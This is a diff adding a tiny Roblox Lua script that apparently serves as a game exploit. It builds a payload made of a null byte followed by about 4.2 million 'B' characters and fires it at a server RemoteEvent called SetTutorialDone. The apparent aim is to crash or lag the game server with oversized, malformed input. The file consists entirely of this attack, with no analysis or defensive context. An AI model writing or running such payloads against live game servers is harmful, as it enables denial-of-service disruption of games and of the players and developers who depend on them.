@@ -1,0 +1,5 @@
+local args = {
+    [1] = "\0" .. string.rep("B", 4200000)
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("Remote"):WaitForChild("SetTutorialDone"):FireServer(unpack(args))
